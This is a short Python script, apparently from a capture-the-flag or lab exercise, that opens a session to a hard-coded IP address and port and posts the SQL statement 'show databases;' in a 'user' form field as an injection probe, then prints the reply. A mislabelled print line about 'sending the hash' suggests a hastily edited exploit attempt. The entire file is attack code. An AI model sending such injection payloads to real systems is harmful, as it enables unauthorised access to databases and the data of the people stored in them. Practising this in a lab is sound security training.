import requests

target_host = "http://178.128.40.63:31412/"

r = requests.session()
res = r.get(target_host)
#print(f"RESPONSE: {res.text}")

data = {
    "user": "show databases;"
}

res = r.post(url=target_host, data = data)
print(f"RESPONSE AFTER SENDING THE HASH: {res.text}")